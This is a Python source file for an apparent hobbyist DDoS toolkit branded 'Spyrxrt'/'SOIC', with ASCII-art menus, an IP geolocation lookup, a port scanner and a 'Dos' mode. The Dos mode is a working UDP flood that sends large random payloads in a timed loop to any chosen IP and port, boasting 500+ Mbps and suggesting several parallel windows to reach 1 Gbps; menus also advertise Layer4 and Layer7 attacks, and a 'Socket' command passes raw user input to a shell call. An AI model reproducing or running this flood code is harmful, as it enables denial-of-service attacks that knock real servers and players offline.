import socket
import random
import time
import os
import colorama
from os import system, name
import os, threading, requests, datetime, time, socket, socks, ssl, random, socket
import socket
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
from sys import stdout
from colorama import Fore, init
from sys import argv
from threading import Thread
import requests


# !
# copyright 2024
# !
# Made by Spyrxrt
# date 29/1/24
# Version 0.4


def layer7():
    ascii_art =  """
██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝ 
███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║  
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝  
"""

    # Split the ASCII art into two halves
    ascii_art_parts = ascii_art.split('\n')
    half_length = len(ascii_art_parts[0]) // 2

    # Print the first half in red
    print(Fore.RED + '\n'.join(line[:half_length] for line in ascii_art_parts))

    # Print the second half in magenta
    print(Fore.MAGENTA + '\n'.join(line[half_length:] for line in ascii_art_parts))
    print(Fore.LIGHTRED_EX + '''
╔════════════════════════════════════════════════════════════════╗
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Socket \x1b[38;2;255;20;147m|\x1b[38;2;255;255;255m Perform Socket attack                          \x1b[38;2;255;20;147m     ║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Flood  \x1b[38;2;255;20;147m|\x1b[38;2;255;255;255m Perform Flood attack                           \x1b[38;2;255;20;147m     ║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Raw    \x1b[38;2;255;20;147m|\x1b[38;2;255;255;255m Perform Raw attack                             \x1b[38;2;255;20;147m     ║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Back   \x1b[38;2;255;20;147m|\x1b[38;2;255;255;255m Go back to previous menu                       \x1b[38;2;255;20;147m     ║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Exit   \x1b[38;2;255;20;147m|\x1b[38;2;255;255;255m Exit the program                               \x1b[38;2;255;20;147m     ║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Refresh\x1b[38;2;255;20;147m|\x1b[38;2;255;255;255m Refresh the current menu                       \x1b[38;2;255;20;147m     ║
╚════════════════════════════════════════════════════════════════╝''')






def tools():

    stdout.write("\n")
    stdout.write("                    "+Fore.LIGHTWHITE_EX+"████████╗ ██████╗  ██████╗ ██╗             \n")
    stdout.write("                    "+Fore.RED    +"╚══██╔══╝██╔═══██╗██╔═══██╗██║             \n")
    stdout.write("                    "+Fore.RED    +"   ██║   ██║   ██║██║   ██║██║             \n")
    stdout.write("                    "+Fore.RED    +"   ██║   ██║   ██║██║   ██║██║             \n")
    stdout.write("                    "+Fore.RED    +"   ██║   ╚██████╔╝╚██████╔╝███████╗             \n")
    stdout.write("                    "+Fore.RED    +"   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝             \n")
    stdout.write("             "+Fore.RED            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.RED            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.RED            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.RED+" |"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.RED+"                    ║\n")
    stdout.write("             "+Fore.RED            +"║  Perform a geolocation lookup based on an IP address║\n")
    stdout.write("             "+Fore.RED            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.RED+" |"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup   "+Fore.RED+"                    ║\n")
    stdout.write("             "+Fore.RED            +"║  Perform a DNS lookup to resolve a domain name      ║\n")
    stdout.write("             "+Fore.RED            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.RED+" |"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.RED+"              ║\n")
    stdout.write("             "+Fore.RED            +"║  Perform a lookup for information about a subnet    ║\n")
    stdout.write("             "+Fore.RED            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"details"+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Get detailes  about an IP address "+Fore.RED+"       ║\n")
    stdout.write("             "+Fore.RED            +"║  Retrieve comprehensive details about an IP address ║\n")
    stdout.write("             "+Fore.RED            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"scan   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Perform a port scan       "+Fore.RED+"               ║\n")
    stdout.write("             "+Fore.RED            +"║  Scan a target for open ports                       ║\n")
    stdout.write("             "+Fore.RED            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Exit the tool             "+Fore.RED+"               ║\n")
    stdout.write("             "+Fore.RED            +"║  Exit the tool and return to the command line       ║\n")
    stdout.write("             "+Fore.RED            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")















def ip_ports():
    global ports
    print("\x1b[38;2;255;0;0m╔═══════════════╗")
    print("\x1b[38;2;255;0;0m║     \x1b[38;2;255;255;255mPorts     \x1b[38;2;255;0;0m║")
    print("\x1b[38;2;255;0;0m╔═══════════════╩═══════════════╩═══════════════╗")
    print(
        "\x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m21 - \x1b[38;2;255;255;255mSFTP       \x1b[38;2;255;0;0m69   - \x1b[38;2;255;255;255mTFTP      \x1b[38;2;255;0;0m5060  - \x1b[38;2;255;255;255mRIP  \x1b[38;2;255;0;0m║")
    print(
        "\x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m22 - \x1b[38;2;255;255;255mSSH        \x1b[38;2;255;0;0m80   - \x1b[38;2;255;255;255mHTTP      \x1b[38;2;255;0;0m30120 - \x1b[38;2;255;255;255mFIVEM\x1b[38;2;255;0;0m║")
    print(
        "\x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m23 - \x1b[38;2;255;255;255mTELNET     \x1b[38;2;255;0;0m443  - \x1b[38;2;255;255;255mHTTPS                  \x1b[38;2;255;0;0m║")
    print(
        "\x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m25 - \x1b[38;2;255;255;255mSMTP       \x1b[38;2;255;0;0m3074 - \x1b[38;2;255;255;255mXBOX                   \x1b[38;2;255;0;0m║")
    print(
        "\x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m53 - \x1b[38;2;255;255;255mDNS        \x1b[38;2;255;0;0m5060 - \x1b[38;2;255;255;255mPLAYSATION             \x1b[38;2;255;0;0m║")
    print(
        "\x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m25 - \x1b[38;2;255;255;255mMINECRAFT  \x1b[38;2;255;0;0m25565 - \x1b[38;2;255;255;255mMINECRAFT             \x1b[38;2;255;0;0m║")
    print("\x1b[38;2;255;0;0m╚═══════════════════════════════════════════════╝")







def layer4():
    ascii_art =  """
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝
"""

    # Split the ASCII art into two halves
    ascii_art_parts = ascii_art.split('\n')
    half_length = len(ascii_art_parts[0]) // 2

    # Print the first half in red
    print(Fore.RED + '\n'.join(line[:half_length] for line in ascii_art_parts))

    # Print the second half in magenta
    print(Fore.MAGENTA + '\n'.join(line[half_length:] for line in ascii_art_parts))
    print(Fore.LIGHTRED_EX +'''
╔════════════════════════════════════════════════════════════════╗
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m UDP Bypass \x1b[38;2;255;20;147m |\x1b[38;2;255;255;255m Perform UDP Bypass attack                      \x1b[38;2;255;20;147m║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m UDP Destroy \x1b[38;2;255;20;147m|\x1b[38;2;255;255;255m Perform UDP Destroy attack                     \x1b[38;2;255;20;147m║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Back       \x1b[38;2;255;20;147m |\x1b[38;2;255;255;255m Go back to previous menu                       \x1b[38;2;255;20;147m║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Exit       \x1b[38;2;255;20;147m |\x1b[38;2;255;255;255m Exit the program                               \x1b[38;2;255;20;147m║
║ \x1b[38;2;255;20;147m•\x1b[38;2;255;255;255m Refresh    \x1b[38;2;255;20;147m |\x1b[38;2;255;255;255m Refresh the current menu                       \x1b[38;2;255;20;147m║
╚════════════════════════════════════════════════════════════════╝''')









# logo
def help():
    sys.stdout.write("                                                                                         \n")
    sys.stdout.write("                                                                                         \n")
    sys.stdout.write("                   " + Fore.LIGHTWHITE_EX + "██╗  ██╗███████╗██╗     ██████╗             \n")
    sys.stdout.write("                   " + Fore.RED +         "██║  ██║██╔════╝██║     ██╔══██╗             \n")
    sys.stdout.write("                   " + Fore.RED +         "███████║█████╗  ██║     ██████╔╝              \n")
    sys.stdout.write("                   " + Fore.RED +         "██╔══██║██╔══╝  ██║     ██╔═══╝               \n")
    sys.stdout.write("                   " + Fore.RED +         "██║  ██║███████╗███████╗██║                 \n")
    sys.stdout.write("                   " + Fore.RED +         "╚═╝  ╚═╝╚══════╝╚══════╝╚═╝                   \n")
    sys.stdout.write("             " + Fore.RED +         "        ══╦═════════════════════════════════╦══\n")
    sys.stdout.write("             " + Fore.RED +         "╔═════════╩═════════════════════════════════╩═════════╗\n")
    sys.stdout.write(
        "             " + Fore.RED         + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "Layer4   " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " Perform Layer4 attack                  " + Fore.RED +         "║\n")
    sys.stdout.write(
        "             " + Fore.RED +         "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "scan     " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " Scan an IP for vulnerabilities         " + Fore.RED +         "║\n")
    sys.stdout.write(
        "             " + Fore.RED +         "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "details  " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " Find details about an IP               " + Fore.RED +         "║\n")
    sys.stdout.write(
        "             " + Fore.RED +         "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "exit     " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " Exit                                   " + Fore.RED +         "║\n")
    sys.stdout.write(
        "             " + Fore.RED +         "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "layer7   " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " Perform Layer 7 attack                 " + Fore.RED +         "║\n")
    sys.stdout.write("             " + Fore.RED +        "╠═════════════════════════════════════════════════════╣\n")
    sys.stdout.write(
        "             " + Fore.RED +         "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "THANK    " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " Thanks for using Spyxrtxx.             " + Fore.RED +         "║\n")
    sys.stdout.write(
        "             " + Fore.RED +         "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "YOU♥     " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " Plz star project :)                    " + Fore.RED +         "║\n")
    sys.stdout.write(
        "             " + Fore.RED +         "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "github   " + Fore.LIGHTRED_EX + "|" + Fore.LIGHTWHITE_EX + " https://github.com/tshiertuseras       " + Fore.RED +         "║\n")
    sys.stdout.write("             " + Fore.RED +        "╚═════════════════════════════════════════════════════╝\n")
    sys.stdout.write("\n")

# logo end


# imports start
try:
    import os

    import sys

    from ping3 import ping, verbose_ping

    from colorama import Fore

    import threading

    import requests

    from time import sleep

    import socket

    import random



except ImportError as e:
    exit(f"Missing MAIN library: {e.name} !! \nInstall it with: pip install {e.name}")

from colorama import Fore, Back, Style


# imports end


# defs
def get_details(ip_address):
    url = f"https://ipinfo.io/{ip_address}/json"
    response = requests.get(url)
    data = response.json()
    return data


def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open")
        sock.close()
    except socket.error:
        print("Couldn't connect to server")


def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def refresh():
    os.system("python soic.py")


def main():
    global main
    input_is_correct = True
    ip_is_incorrect = True
    Dos = True



    # defs end

    # Ai start
    while input_is_correct:
        def start():
            global main1
#            print("*" * 200)
#            os.system(Fore.RED + "https://idk-two-gold.vercel.app/api/main")
#            os.system(Fore.RED + "https://github.com/tshiertuseras")
#            print("*" * 200)
            print(Fore.MAGENTA + "[+]Tip type help to see the commands.")
            main1 = input('''\x1b[38;2;255;0;0m[Spyrxrt/\x1b[38;2;255;0;0mME\x1b[38;2;255;0;0mN\x1b[38;2;255;0;0mU\x1b[38;2;255;0;0m]
            \x1b[38;2;255;0;0m╚\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m➤ \x1b[38;2;255;0;0m'''+ Fore.WHITE)

        start()
        if main1 in["TOOLS","tools","Tools","tool","TOOLS"]:
            tools()
        if main1 not in ["exit", "EXIT", "Exit"]:
            pass
        else:
            break

        if main1 in ["refresh","res","Refresh","REFRESH"]:
            refresh()

        elif main1 in ["Layer4","LAYER4","L4","l4","layer4"]:
            layer4()

        elif main1 in ["cls","CLS","clear","Clear","CLEAR"]:
            os.system("cls")

        elif main1 in ["l7","L7","Layer7","L7","layer7","LAYER7","layer7","layer7",]:
            layer7()

        elif "Socket" in main1:
            try:
                url = main1.split()[1]
                per = main1.split()[2]
                time = main1.split()[3]
                os.system(f'node socket.js {url} {per} {time}')
            except IndexError:
                print(Fore.GREEN + 'Usage: socket <url> <per> <time>')
                print(Fore.GREEN + 'Example: socket http://example.com 5000 60')
                print

        if main1 in ["help", "Help"]:
            help()

        elif main1 in ["EXIT", "exit", "ex"]:
            exit()

        # details
        if main1 in ["details","subnet","DETAILS","Subnet","SUBNET","Details"]:
            print("\n" * 100)
            init()

            # Text to display
            text = """
            ███████╗██████╗ ██╗   ██╗██████╗ ██╗  ██╗██████╗ ████████╗
            ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚██╗██╔╝██╔══██╗╚══██╔══╝
            ███████╗██████╔╝ ╚████╔╝ ██████╔╝ ╚███╔╝ ██████╔╝   ██║   
            ╚════██║██╔═══╝   ╚██╔╝  ██╔══██╗ ██╔██╗ ██╔══██╗   ██║   
            ███████║██║        ██║   ██║  ██║██╔╝ ██╗██║  ██║   ██║   
            ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
            """

            # Print the text in red
            print(Fore.RED + text)

            print()
            print(Fore.RED)
            print("All rights reserved ©")
            print(Fore.RED + "We aren't responsible for whatever you do using this tool. Use it at your own risk.")
            print(Fore.MAGENTA + "\n Enter the ip you want to get details. Example: 1.1.1.1")
            print('''
\033[38;2;255;0;0m┌────────────────────────┐
\033[38;2;255;0;0m│\033[38;2;255;255;255mEnter \033[38;2;255;0;0mIP Address\033[38;2;255;255;255m: \033[38;2;255;0;0m\033[1m      │    
\033[38;2;255;0;0m└────────────────────────┘''')
            ip_address = input('''\x1b[38;2;255;0;0m[Spyrxrt\x1b[38;2;255;0;0m/DE\x1b[38;2;255;0;0mAI\x1b[38;2;255;0;0mLS\x1b[38;2;255;0;0m]
            \x1b[38;2;255;0;0m╚\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m➤ \x1b[38;2;255;0;0m''')
            details = get_details(ip_address)

            print(Fore.LIGHTGREEN_EX + "*" * 200)
            print("IP Address:", details["ip"])
            print("Hostname:", details.get("hostname", "Not available"))
            print("Country:", details["country"])
            print("City:", details["city"])
            print("Region:", details["region"])
            print("Location (Coordinates):", details["loc"])
            print("ISP:", details["org"])
            print(Fore.LIGHTGREEN_EX + "*" * 200)
            print("You have 10 secconds to copy the info. ")
            sleep(10)
            clear()

            os.system("python soic.py")
        # details end

        elif main1 in ["dns","DNS"]:
            os.system("start https://idk-two-gold.vercel.app/api/main")

        # scan
        if main1 == "scan":

            print("\n" * 100)
            print(Fore.RED)

            text = """
            ███████╗██████╗ ██╗   ██╗██████╗ ██╗  ██╗██████╗ ████████╗
            ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚██╗██╔╝██╔══██╗╚══██╔══╝
            ███████╗██████╔╝ ╚████╔╝ ██████╔╝ ╚███╔╝ ██████╔╝   ██║   
            ╚════██║██╔═══╝   ╚██╔╝  ██╔══██╗ ██╔██╗ ██╔══██╗   ██║   
            ███████║██║        ██║   ██║  ██║██╔╝ ██╗██║  ██║   ██║   
            ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
            """


            print(Fore.RED + text)
#            print(Fore.BLUE + """
#              |-----------------|
#              | SPYRXt v3       |
#              | Inspired by SPYR|
#              | Creator: Spyrx  |
#             | Purpose: Scan_ip|
#              | & DDoS Attacks  |
#              | Xtream Orbit Ion|
#              | Canon           |
#              |-----------------|
#           """)
            print(Fore.MAGENTA + "All rights reserved ©")
            print(Fore.RED +"[!]" , "We aren't responsible for whatever you do using this tool. Use it at your own risk. " + Fore.MAGENTA )
            print('''
\033[38;2;255;0;0m┌────────────────────────┐
\033[38;2;255;0;0m│\033[38;2;255;255;255mEnter \033[38;2;255;0;0mIP Address\033[38;2;255;255;255m: \033[38;2;255;0;0m\033[1m      │    
\033[38;2;255;0;0m└────────────────────────┘''')
            host = input('''\x1b[38;2;255;0;0m╔══[SPYXRT/\x1b[38;2;255;0;0mSCAN\x1b[38;2;255;0;0m\x1b[38;2;255;0;0m\x1b[38;2;255;0;0m\x1b[38;2;255;0;0m]
\x1b[38;2;255;0;0m╚\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m➤ \x1b[38;2;255;0;0m''')
            ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]

            print(f"Scanning IP address: {host}")
            open_ports = []

            for port in ports:
                try:
                    scan_port(host, port)
                    open_ports.append(port)
                except KeyboardInterrupt:
                    print("Scanning stopped by user.")
                    break

            if open_ports:
                print(f"The following ports are open: {open_ports}")
            else:
                print("No open ports found.")
        # scan end
        elif main1 == "exit":
            break

        elif main1 in ["refresh", "res"]:
            os.system("python xoic.py")

        # Dos
        if main1 == "Dos":
            print("\n" * 100)

            text = """
            ███████╗██████╗ ██╗   ██╗██████╗ ██╗  ██╗██████╗ ████████╗
            ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚██╗██╔╝██╔══██╗╚══██╔══╝
            ███████╗██████╔╝ ╚████╔╝ ██████╔╝ ╚███╔╝ ██████╔╝   ██║   
            ╚════██║██╔═══╝   ╚██╔╝  ██╔══██╗ ██╔██╗ ██╔══██╗   ██║   
            ███████║██║        ██║   ██║  ██║██╔╝ ██╗██║  ██║   ██║   
            ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
            """

            # Print the text in red
            print(Fore.RED + text)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            print("All rights reserved ©")
            print(Fore.RED + "We aren't responsible for whatever you do using this tool. Use it at your own risk.")
            print("")
            print(Fore.RED + "             SOIC Details: ")
#            print(Fore.BLUE + """
#              |-----------------|
#             | SPYRXt v3       |
#             | Inspired by SPYR|
#             | Creator: Spyrx  |
#             | Purpose: Scan_ip|
#              | & DDoS Attacks  |
#             | Xtream Orbit Ion|
#            | Canon           |
#             |-----------------|
#            """)

            print(Fore.RED + "DoS Speed: " + Fore.WHITE + "NEW 500+ Mbps")
            print(Fore.RED + "[!] " + Fore.WHITE + "Tip: Open & Use SPYRXT on multiple Windows to get 1Gbps")
            print("")

            bytes = random._urandom(65000)
            bytes1 = random._urandom(65000)
            bytes2 = random._urandom(65000)
            bytes3 = random._urandom(65000)
            bytes = random._urandom(65000)
            bytes1 = random._urandom(60000000)
            bytes2 = random._urandom(65000)
            bytes3 = random._urandom(65000)
            bytes = random._urandom(65000)
            bytes1 = random._urandom(65000)
            bytes2 = random._urandom(65000)
            bytes3 = random._urandom(65000)


            print('''
\033[38;2;255;0;0m┌────────────────────────┐
\033[38;2;255;0;0m│\033[38;2;255;255;255mEnter \033[38;2;255;0;0mIP Address\033[38;2;255;255;255m: \033[38;2;255;0;0m\033[1m      │    
\033[38;2;255;0;0m└────────────────────────┘''')
            while ip_is_incorrect:
                ip = (input('''
\033[38;2;255;0;0m➤ '''))

                if not ip.__contains__("."):
                    pass
                else:
                    ip_is_incorrect = False
                    pass
            ip_ports()
            port = int(input(Fore.RED + 'Port: ' + Fore.GREEN))

            duration = input(Fore.RED + 'Number of seconds to send packets: ' + Fore.GREEN)
            print(" ")

            import time
            timeout = time.time() + float(duration)
            sent = 0

            while Dos:
                if time.time() > timeout:
                    break
                else:
                    pass
                sock.sendto(bytes, (ip, port))
                sock.sendto(bytes1, (ip, port))
                sock.sendto(bytes2, (ip, port))
                sock.sendto(bytes3, (ip, port))
                sock.sendto(bytes, (ip, port))
                sock.sendto(bytes1, (ip, port))
                sock.sendto(bytes2, (ip, port))
                sock.sendto(bytes3, (ip, port))
                sock.sendto(bytes, (ip, port))
                sock.sendto(bytes1, (ip, port))
                sock.sendto(bytes2, (ip, port))
                sock.sendto(bytes3, (ip, port))
                sent = sent + 1

                print(Fore.RED + "[+] " + Fore.GREEN + "SOIC " + Fore.RED + "Sent %s packet to %s through port %s" % (
                sent, ip, port))
        # Dos end


main()












